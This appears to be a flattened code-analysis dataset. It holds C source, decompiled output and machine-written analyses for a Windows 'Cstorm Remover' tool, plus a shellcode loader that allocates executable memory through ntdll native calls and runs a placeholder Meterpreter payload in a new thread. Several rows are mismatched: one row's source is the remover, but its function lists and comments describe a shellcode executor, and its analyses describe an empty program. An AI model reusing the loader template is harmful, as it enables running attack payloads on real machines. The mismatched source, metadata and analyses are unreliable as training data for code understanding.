strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"");
strcpy(tmp,""del \"""");
strcat(tmp,s);
strcat(tmp,""\"""");
f=fopen(s,""r"");
if(f!=NULL)
{
printf(""\nCstorm Infection Detected!:%s"",s);
printf(""\nAttempting Repairs!\n"");
fclose(f);
system(tmp);
}
else
fclose(f);
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"",""r"");
if(f!=NULL)
{
printf(""\nCstorm Infection Detected!"");
printf(""\nAttempting Repairs!\n"");
strcpy(tmp2,""del \"""");
strcat(tmp2,""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"");
strcat(tmp2,""\"""");
fclose(f);
system(tmp2);
}
else
fclose(f);
}
//Perform cleaning of temporary files generated .
void ok()
{
remove(""user"");
}
//Load all reqired functions.
void run()
{
tunnel();
tscan();
}
//Function to pause the program.
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
system(""title Cstorm Remover "");
run();
ok();
printf(""All operations completed...\n"");
pause();
}","{
""functions"": [
""tunnel"",
""tscan"",
""ok"",
""run"",
""pause"",
""main""
]
}","{
""variables"": [
""s"",
""f"",
""tmp"",
""tmp2"",
""ch"",
""i""
]
}","// Cstorm Remover
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm Remover was developed independently by M.Anish For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
// Function to get Current User in Windows who is logged in.
// Function to detect and remove chrome.bat in the startup folder in windows.
// Perform cleaning of temporary files generated .
// Load all required functions.
// Function to pause the program.","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
void _ok(void);
int __cdecl _remove(char *_Filename);
int __cdecl _puts(char *_Str);
void _run(void);
void _tscan(void);
void __cdecl _exit(int _Code);
int __cdecl _system(char *_Command);
char * __cdecl _strcat(char *_Dest,char *_Source);
int __cdecl _fscanf(FILE *_File,char *_Format,...);
void _tunnel(void);
void _pause(void);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
___main();
_system(""title Cstorm Remover "");
_run();
_ok();
_puts(""All operations completed..."");
_pause();
return 0;
}

void _tscan(void)
{
char cVar1;
int iVar2;
uint uVar3;
undefined4 *puVar4;
char *pcVar5;
undefined4 *puVar6;
undefined local_40d;
undefined4 local_40c;
undefined2 local_408;
undefined4 uStack_3c9;
undefined auStack_3c5 [278];
undefined uStack_2af;
undefined4 local_2ae;
undefined2 local_2aa;
undefined4 uStack_151;
undefined auStack_14d [66];
undefined4 uStack_10b;
undefined auStack_107 [227];
FILE *local_24;
int local_20;
local_20 = 0;
local_24 = _fopen(""user"",""r"");
if (local_24 == (FILE )0x0) {
/ WARNING: Subroutine does not return */
_exit(0);
}
while (((local_24->_flag & 0x10U) == 0 && (_fscanf(local_24,""%c"",&local_40d), local_40d != '\n')))
{
*(char *)((int)&uStack_151 + local_20 + 1) = local_40d;
local_20 = local_20 + 1;
}
*(undefined *)((int)&uStack_151 + local_20 + 1) = 0;
_fclose(local_24);
uVar3 = 0xffffffff;
pcVar5 = (char *)((int)&uStack_151 + 1);
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *pcVar5;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)((int)&uStack_151 + uVar3) = 0x7070415c;
*(undefined4 *)((int)&uStack_10b + uVar3) = 0x746162;
puVar6 = (undefined4 *)((int)&uStack_151 + uVar3 + 4 & 0xfffffffc);
iVar2 = (int)(undefined4 *)((int)&uStack_151 + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" +
-iVar2);
for (uVar3 = iVar2 + 0x4aU >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
local_2ae = 0x206c6564;
local_2aa = 0x22;
_strcat((char *)&local_2ae,(char *)((int)&uStack_151 + 1));
uVar3 = 0xffffffff;
puVar4 = &local_2ae;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
*(undefined2 *)(&uStack_2af + ~uVar3) = 0x22;
local_24 = _fopen((char *)((int)&uStack_151 + 1),""r"");
if (local_24 == (FILE *)0x0) {
_fclose((FILE *)0x0);
}
else {
_printf(""\nCstorm Infection Detected!:%s"",(int)&uStack_151 + 1);
_puts(""\nAttempting Repairs!"");
_fclose(local_24);
_system((char *)&local_2ae);
}
local_24 = _fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat""
,""r"");
if (local_24 == (FILE *)0x0) {
_fclose((FILE *)0x0);
}
else {
_printf(""\nCstorm Infection Detected!"");
_puts(""\nAttempting Repairs!"");
local_40c = 0x206c6564;
local_408 = 0x22;
uVar3 = 0xffffffff;
puVar4 = &local_40c;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)(&local_40d + uVar3) = 0x505c3a43;
*(undefined4 *)((int)&uStack_3c9 + uVar3) = 0x746162;
puVar6 = (undefined4 *)((int)&local_40c + uVar3 + 3 & 0xfffffffc);
iVar2 = (int)(&local_40d + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"" +
-iVar2);
for (uVar3 = iVar2 + 0x48U >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
uVar3 = 0xffffffff;
puVar4 = &local_40c;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
*(undefined2 *)(&local_40d + ~uVar3) = 0x22;
_fclose(local_24);
_system((char *)&local_40c);
}
return;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
// ------------------- Function Prototypes --------------------
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _ok(void);
int32_t _pause(void);
int32_t _run(void);
int32_t _tscan(void);
int32_t _tunnel(int32_t a1);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403f00
int32_t g2 = 0; // 0x407028
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401475
int32_t _tunnel(int32_t a1) {
// 0x401460
return system(""echo %USERPROFILE%>user"");
}
// Address range: 0x401475 - 0x401726
int32_t _tscan(void) {
struct _IO_FILE * file = fopen(""user"", ""r""); // 0x401497
if (file == NULL) {
// 0x4014a5
exit(0);
// UNREACHABLE
}
int32_t * v1 = (int32_t *)((int32_t)file + 12); // 0x4014f4
int32_t str2; // bp-336, 0x401475
int32_t v2 = &str2;
int32_t v3 = 0; // 0x4014fc
int32_t v4 = 0; // 0x4014fc
if ((*v1 & 16) == 0) {
int32_t v5; // bp-1037, 0x401475
fscanf(file, ""%c"", &v5);
char v6 = v5; // 0x4014d5
v4 = v3;
while (v6 != 10) {
// 0x4014d9
*(char *)(v3 + v2) = v6;
v3++;
v4 = v3;
if ((*v1 & 16) != 0) {
// break -> 0x401501
break;
}
fscanf(file, ""%c"", &v5);
v6 = v5;
v4 = v3;
}
}
// 0x401501
*(char )(v4 + v2) = 0;
fclose(file);
bool v7; // 0x401475
int32_t v8 = v7 ? -1 : 1;
int32_t v9 = -1; // 0x40152e
int32_t v10 = v2; // 0x40152e
int32_t v11 = 0; // 0x40152e
while (v9 != 0) {
int32_t v12 = v10;
v9--;
v10 = v12 + v8;
v11 = v9;
if ((char *)v12 == 0) {
// break ->
break;
}
v11 = 0;
}
int32_t v13 = -2 - v11 + v2; // 0x40153d
*(int32_t *)v13 = 0x7070415c;
int32_t v14 = *(int32_t *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" + 70); // 0x40154d
*(int32_t *)(v13 + 70) = v14;
int32_t v15 = v13 + 4 & -4; // 0x401558
int32_t v16 = v13 - v15; // 0x40155b
__asm_rep_movsd_memcpy((char *)v15, (char *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" - v16), (v16 + 74) / 4);
int32_t str = 0x206c6564; // bp-686, 0x401575
strcat((char *)&str, (char )&str2);
int32_t v17 = &str; // 0x4015ab
int32_t v18 = -1; // 0x4015ad
int32_t v19 = v17; // 0x4015ad
int32_t v20 = 0; // 0x4015ad
while (v18 != 0) {
int32_t v21 = v19;
v18--;
v19 = v21 + v8;
v20 = v18;
if ((char *)v21 == 0) {
// break ->
break;
}
v20 = 0;
}
*(int16_t *)(v17 - 2 - v20) = 34;
struct _IO_FILE * file2 = fopen((char *)&str2, ""r""); // 0x4015d4
if (file2 == NULL) {
// 0x40161f
fclose(NULL);
} else {
// 0x4015e2
printf(""\nCstorm Infection Detected!:%s"", &str2);
puts(""\nAttempting Repairs!"");
fclose(file2);
system((char )&str);
}
struct _IO_FILE * file3 = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"", ""r""); // 0x401639
if (file3 == NULL) {
// 0x40171a
return fclose(NULL);
}
// 0x40164b
printf(""\nCstorm Infection Detected!"");
puts(""\nAttempting Repairs!"");
int32_t command = 0x206c6564; // bp-1036, 0x401669
int32_t v22 = &command; // 0x401687
int32_t v23 = -1; // 0x401689
int32_t v24 = v22; // 0x401689
int32_t v25 = 0; // 0x401689
while (v23 != 0) {
int32_t v26 = v24;
v23--;
v24 = v26 + v8;
v25 = v23;
if ((char *)v26 == 0) {
// break ->
break;
}
v25 = 0;
}
int32_t v27 = -2 - v25 + v22; // 0x401698
*(int32_t *)v27 = 0x505c3a43;
int32_t v28 = *(int32_t *)((int32_t)""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"" + 68); // 0x4016a8
*(int32_t *)(v27 + 68) = v28;
int32_t v29 = v27 + 4 & -4; // 0x4016b3
int32_t v30 = v27 - v29; // 0x4016b6
__asm_rep_movsd_memcpy((char *)v29, (char )((int32_t)""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"" - v30), (v30 + 72) / 4);
int32_t v31 = -1; // 0x4016de
int32_t v32 = v22; // 0x4016de
int32_t v33 = 0; // 0x4016de
while (v31 != 0) {
int32_t v34 = v32;
v31--;
v32 = v34 + v8;
v33 = v31;
if ((char *)v34 == 0) {
// break ->
break;
}
v33 = 0;
}
*(int16_t )(v22 - 2 - v33) = 34;
fclose(file3);
// 0x40171a
return system((char )&command);
}
// Address range: 0x401726 - 0x40173b
int32_t _ok(void) {
// 0x401726
return remove(""user"");
}
// Address range: 0x40173b - 0x40174e
int32_t _run(void) {
// 0x40173b
int32_t v1; // 0x40173b
_tunnel(v1);
return _tscan();
}
// Address range: 0x40174e - 0x40176f
int32_t _pause(void) {
// 0x40174e
putchar(10);
return system(""pause"");
}
// Address range: 0x40176f - 0x4017ab
int main(int argc, char ** argv) {
// 0x40176f
___main();
system(""title Cstorm Remover "");
_run();
_ok();
puts(""All operations completed..."");
_pause();
return 0;
}
// Address range: 0x401c90 - 0x401cd6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x401cc6
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x401cc6
v1 = v2;
v2 = v1 + 1;
}
// 0x401cd4
if (v1 == 0) {
// 0x401caf
return atexit((void ()())0x401c60);
}
int32_t v3 = v1; // 0x401ca1
while (v3 != 1) {
// 0x401ca3
v3--;
}
// 0x401caf
return atexit((void ()())0x401c60);
}
// Address range: 0x401ce0 - 0x401cfc
int32_t ___main(void) {
int32_t result = g2; // 0x401ce0
if (result != 0) {
// 0x401ce9
return result;
}
// 0x401cf0
g2 = 1;
return ___do_global_ctors();
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 8","1. The primary functionality of the code is to remove an infection caused by a file named ""chrome.bat"" from the startup folder on a Windows machine. This file is associated with the ""Cstorm"" malware, and the tool automates its detection and removal.

2. Three key functions:
   a. **tunnel()**: This function retrieves the current user's profile path by executing a system command and writing the output to a file named ""user"".
   b. **tscan()**: This function reads the user profile path from the ""user"" file, constructs the path to the ""chrome.bat"" malware in the startup folder, and attempts to delete it if found.
   c. **pause()**: This utility function pauses the program execution and waits for user interaction before proceeding, likely used at the end to show the results of the operation.

3. The variable **s** in the `tscan()` function initially contains the user profile path read from the ""user"" file. It is then used to construct the full pathname of the ""chrome.bat"" file to check for its existence and carry out its deletion.

4. The error handling mechanism is minimal. The program exits if it cannot open the ""user"" file. Upon failure to open the ""chrome.bat"" file, the program determines it does not exist and skips deletion. However, it doesn't handle errors during file deletion or cover other exceptions.

5. Execution flow in `tscan()`:
   - Open and read the ""user"" file for the profile path.
   - Construct the path of ""chrome.bat"" in the user's startup folder.
   - Check for the presence of ""chrome.bat"" and delete if necessary.
   - Repeat the process for the common startup folder location.
   - Close any open file descriptors.

6. External libraries:
   - **stdio.h**: Functions for input and output operations (fopen, fscanf, fclose, printf).
   - **stdlib.h**: Functions for system calls (system), dynamic memory allocation, control of execution (exit).
   - **string.h**: Functions for manipulating arrays of characters (strcat, strcpy).
   - **ctype.h**: Functions to determine types contained within character data (not explicitly used in the code).

7. Security concerns:
   - Using `system()` for executing commands introduces the risk of command injection and can be insecure if input is not sanitized.
   - The program creates a temporary file ""user"" to store sensitive data without proper cleanup.
   - The code doesn't validate the contents of the ""user"" file, potentially reading malicious input.
   - There is no mechanism for ensuring that the actual ""chrome.bat"" being deleted is malicious, which might lead to false positives and accidental file deletion.","1. The primary functionality of this code appears to be to detect and remove instances of a file named `chrome.bat` in certain startup folders that could be related to a specific malware infection named ""Cstorm"".

2. 
   - `_fopen`: Opens a file with the given filename and mode (`""r""` for read). Used here to check the existence and contents of suspect files.
   - `_system`: Executes a system command, in this case, it is used to set the console window title and to execute delete commands for removing infections.
   - `_fscanf`: Reads input from a file according to a format string, utilized here to read characters from a file until a newline is encountered.

3. The variable `local_24` is used to store the file pointer returned by `_fopen`. It is used to keep track of the file being read and checked for the `chrome.bat` infection, and is later used for closing the file with `_fclose`.

4. The error handling mechanism involves checking if file pointers are `NULL` (indicative of an error opening a file), and if so, using `_exit(0)` to prematurely terminate the program without attempting repairs.

5. The flow of execution within the `_tscan` function is as follows:
   - Open the ""user"" file and check for errors.
   - Read characters from the file until a newline appears.
   - Construct the path to a suspect file and check for infection.
   - Generate a delete command string and execute it if the infection is found.
   - Repeat the process for another hard-coded path to a suspect file.

6. The code relies on standard C libraries for file I/O (`<stdio.h>`), string manipulation (`<string.h>`), and standard utilities (`<stdlib.h>`). These libraries provide functions like `_fopen`, `_fscanf`, `_strcat`, and `_system`, among others.

7. Evident security concerns include:
   - The use of `_system`, which can execute potentially dangerous commands, could be exploited if untrusted input is passed.
   - Buffer overflow vulnerabilities might exist due to operations like `_strcat` without proper bounds checking.
   - Lack of detailed error messages and proper error handling might obscure the cause of issues and hinder troubleshooting.","1. The primary functionality of the code seems to be malware removal related to the ""Cstorm"" infection. It scans a user's profile, checks for a specific malware indicator, and attempts to remove it if detected.

2. Three key functions include:
   - `_tscan()`: Opens and reads the ""user"" file, then constructs a path to a batch file and attempts to detect and remove the ""Cstorm"" infection if present.
   - `_ok()`: Removes the ""user"" file created earlier, likely as a cleanup process after the scan and potential removal action.
   - `_run()`: Initiates the malware detection and removal process by calling `_tunnel()` to create the ""user"" file and `_tscan()` to perform the actual scan.

3. `g2`: This global variable is used to determine if the global constructors have been called (initialized to 0, set to 1 after called). It is used to prevent repeated initialization in the `___main()` function.

4. The error handling mechanism in functions like `_tscan()` involves checking the return value of file-related operations (e.g., `fopen()`) and exiting or closing file streams accordingly if an error is detected (e.g., if `file == NULL`).

5. Flow of execution in `_tscan()`: The function opens the ""user"" file, reads its content to construct a file path, checks for existence of malicious files, attempts to remove them if found, reports to the user, and finally cleans up by closing file handles.

6. External libraries or dependencies include:
   - Standard libraries: `<stdbool.h>`, `<stdint.h>`, `<stdio.h>`, `<stdlib.h>`, `<string.h>`
   - Functions likely from the standard C library or system API: `system`, `fopen`, `fscanf`, `fclose`, `exit`, `strcat`, `remove`, `putchar`, `atexit`.

7. Evident security concerns:
   - The `system` call is used, which can be dangerous if the input is not properly sanitized, leading to potential command injection vulnerabilities.
   - The code acts on potentially predictable file names (e.g., ""user""), which might be exploited if an attacker can influence the file's content or existence.
   - The code may execute implicitly trusted batch files that could be manipulated by an attacker.

Note: This analysis does not confirm whether the code is malicious or benign. It is based solely on the provided code snippet without further context."
9,https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop,Done,Windows,"// Cstorm Remover
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm Remover was developed independantly by M.Anish For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
//Function to get Current User in Windows who is logged in.
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
//Function to detect and remove chrome.bat in startup folder in windows.
void tscan()
{
FILE *f;
char s[300],tmp[350],tmp2[350],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"");
strcpy(tmp,""del \"""");
strcat(tmp,s);
strcat(tmp,""\"""");
f=fopen(s,""r"");
if(f!=NULL)
{
printf(""\nCstorm Infection Detected!:%s"",s);
printf(""\nAttempting Repairs!\n"");
fclose(f);
system(tmp);
}
else
fclose(f);
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"",""r"");
if(f!=NULL)
{
printf(""\nCstorm Infection Detected!"");
printf(""\nAttempting Repairs!\n"");
strcpy(tmp2,""del \"""");
strcat(tmp2,""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"");
strcat(tmp2,""\"""");
fclose(f);
system(tmp2);
}
else
fclose(f);
}
//Perform cleaning of temporary files generated .
void ok()
{
remove(""user"");
}
//Load all reqired functions.
void run()
{
tunnel();
tscan();
}
//Function to pause the program.
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
system(""title Cstorm Remover "");
run();
ok();
printf(""All operations completed...\n"");
pause();
}","{
""functions"": [
""ExecuteShellcode"",
""main""
]
}","{
""variables"": [
""code"",
""lpParam"",
""shellcode""
]
}","// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
// Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
// Call the shellcode function using the function pointer
// Insert the Meterpreter shellcode
// Return 0 as the main function exit code","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
___main();
return 0;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <stdint.h>
#include <stdlib.h>
// ------------------- Function Prototypes --------------------
int32_t ___do_global_ctors(void);
int32_t ___main(void);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403bb0
int32_t g2 = 0; // 0x407028
// ------------------------ Functions -------------------------
// Address range: 0x40147a - 0x4014a3
int main(int argc, char ** argv) {
// 0x40147a
___main();
return 0;
}
// Address range: 0x401990 - 0x4019d6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x4019c6
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x4019c6
v1 = v2;
v2 = v1 + 1;
}
// 0x4019d4
if (v1 == 0) {
// 0x4019af
return atexit((void ()())0x401960);
}
int32_t v3 = v1; // 0x4019a1
while (v3 != 1) {
// 0x4019a3
v3--;
}
// 0x4019af
return atexit((void ()())0x401960);
}
// Address range: 0x4019e0 - 0x4019fc
int32_t ___main(void) {
int32_t result = g2; // 0x4019e0
if (result != 0) {
// 0x4019e9
return result;
}
// 0x4019f0
g2 = 1;
return ___do_global_ctors();
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 3","1. The primary function of the code is to detect and remove a specific malicious script named ""chrome.bat"" from Windows startup folders, thus addressing infection by the ""Cstorm"" malware.

2. Three key functions:
   - `tunnel()`: Retrieves the current user's profile path and writes it to a file named ""user"".
   - `tscan()`: Scans for and attempts to remove ""chrome.bat"" from the startup folders if detected.
   - `ok()`: Cleans up by deleting the temporary ""user"" file created during execution.

3. The `s` variable within `tscan()` function stores the path of the user's profile directory retrieved from the ""user"" file. This path is then used to construct the file path to the malicious ""chrome.bat"" script for deletion.

4. The error handling is minimal; if the ""user"" file cannot be opened, the program exits without any specific error message (`f==NULL` check in `tscan()`). It does not handle other potential file I/O errors comprehensively.

5. Flow of execution in `tscan()`:
   - Open and read the current user profile path from ""user"" file.
   - Construct the path to ""chrome.bat"" in the startup folder.
   - Check for the existence of ""chrome.bat"" and delete it if found.
   - Repeat the check and delete process for a common startup folder.

6. External libraries or dependencies:
   - `<stdio.h>`: Standard I/O functions for file handling and console output.
   - `<stdlib.h>`: General-purpose functions, including `system()` used to run external commands.
   - `<string.h>`: String manipulation functions like `strcat()` and `strcpy()`.
   - `<ctype.h>`: Character type checking/conversion functions, though not used in the visible code.

7. Security concerns:
   - Use of `system()` can be risky and lead to command injection if not properly sanitized.
   - There is minimal error and exception handling, leading to potential failures or exploits.
   - Deletes files based on constructed strings, which can be dangerous if strings are manipulated.
   - Assumes the name and location of the malware without verification, possibly missing variations.","1. This code defines a function `_main` that is called with command-line arguments and then simply calls another function `___main()` before returning 0. Its primary functionality is to delegate execution to `___main()` and return a success status code.

2. The key functions are:
    - `int __cdecl _main`: the entry point for command-line applications, receiving command-line arguments and environment variables.
    - `char **_Argv`: a pointer to an array of strings representing command-line arguments.
    - `___main()`: an undefined external function that is presumably called within `_main` to perform the application's primary functionality.

3. The variable `_Argc` holds the number of command-line arguments that the program received. It assists in determining how many arguments are passed to the program, but it is not used in this code snippet.

4. There is no explicit error handling mechanism within the provided code snippet. The function `___main()` is called unconditionally, and `_main` always returns 0, indicating success regardless of the outcome of `___main()`.

5. In the flow of execution, upon the program's invocation, `_main` is initially called with parameters `_Argc`, `_Argv`, and `_Env`. The function `___main()` is then executed immediately after. Once `___main()` completes, `_main` concludes by returning an exit code of 0.

6. The code snippet does not explicitly include external libraries or show dependencies. However, since it's only a snippet, it's possible that any such dependencies or headers are declared elsewhere in the program.

7. A security concern here is the call to an undefined function `___main()`, which could potentially be a vulnerability if `___main()` is not properly implemented. Additionally, without error handling, the program assumes that `___main()` can never fail, which could lead to unchecked errors and potentially be exploited if `___main()` has any vulnerabilities.","1. The primary functionality of the code is to initialize global constructors before the main application code, `main`, is executed. It ensures that all global objects are properly initialized before their usage in the main program.

2. `main`: It's the entry point of the program that calls `___main` before returning 0 to the OS.
   `___do_global_ctors`: Constructs global objects before the main function is executed.
   `___main`: Executes any pre-main initialization, specifically calling `___do_global_ctors` and initializing global variable `g2` to signify that initialization is done.

3. `g2` is used as a flag to determine whether the global constructors have already been initialized. It starts with a value of 0 and is set to 1 after `___main` calls `___do_global_ctors` to prevent redundant initializations.

4. There isn't an explicit error handling mechanism in the provided code. Errors that might occur during the execution of global constructors are not handled, and the returned values from functions like `atexit` are not checked.

5. In `___do_global_ctors`, the flow of execution is a loop that checks addresses from a given start point (`&g1`) for non-zero values, treating them as pointers to constructor functions. Once it finds a zero, it stops and calls `atexit` with a hard-coded function address `0x401960` for cleanup.

6. The code does not include any external libraries within the snippet itself, except for the inclusion of standard headers `<stdint.h>` for integer type definitions, and `<stdlib.h>` for `atexit` function prototype.

7. Security concerns with the code include:
   - Hard-coded function pointer `0x401960` which poses a risk if the memory location is incorrect or maliciously altered.
   - Lack of error checking could lead to undefined behavior if initialization fails or `atexit` fails to register the cleanup function.
   - The loop within `___do_global_ctors` could potentially lead to an infinite loop or memory access violation if the termination condition is not met."
10,https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop,Done,Windows,"#include <stdio.h>
#include <windows.h>
// If NTSTATUS is not defined, define it here
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
// Define the calling convention for the functions if not already defined
#ifndef NTAPI
#define NTAPI __stdcall
#endif
// Define typedefs for function pointers to the native API functions we'll be using.
// These match the function signatures of the respective functions.
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
int main() {
// Insert Meterpreter shellcode here.
unsigned char code[] = ""\xfc\x48\x83..."";
// Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
// or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(""ntdll.dll""), ""NtAllocateVirtualMemory"");
PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(""ntdll.dll""), ""NtWriteVirtualMemory"");
PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(""ntdll.dll""), ""NtCreateThreadEx"");
PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(""ntdll.dll""), ""NtWaitForSingleObject"");
// Ensure that all function pointers are valid
if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject) {
printf(""Failed to load native API functions.\n"");
return 1;
}
// Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
// 'exec' will hold the base address of the allocated memory region.
void* exec = NULL;
SIZE_T size = sizeof(code);
NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// Copy the shellcode into the allocated memory region.
SIZE_T bytesWritten;
NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
// Execute the shellcode in memory using a new thread.
HANDLE hThread;
NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
// Wait for the thread to finish executing.
NtWaitForSingleObject(hThread, FALSE, NULL);
return 0;
}","{
""functions"": [
""main""
]
}","{
""variables"": [
""code"",
""NtAllocateVirtualMemory"",
""NtWriteVirtualMemory"",
""NtCreateThreadEx"",
""NtWaitForSingleObject"",
""exec"",
""size"",
""bytesWritten"",
""hThread""
]
}","// If NTSTATUS is not defined, define it here
// Define the calling convention for the functions if not already defined
// Define typedefs for function pointers to the native API functions we'll be using.
// These match the function signatures of the respective functions.
// Insert Meterpreter shellcode here.
// Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
// or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
// Ensure that all function pointers are valid
// Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
// 'exec' will hold the base address of the allocated memory region.
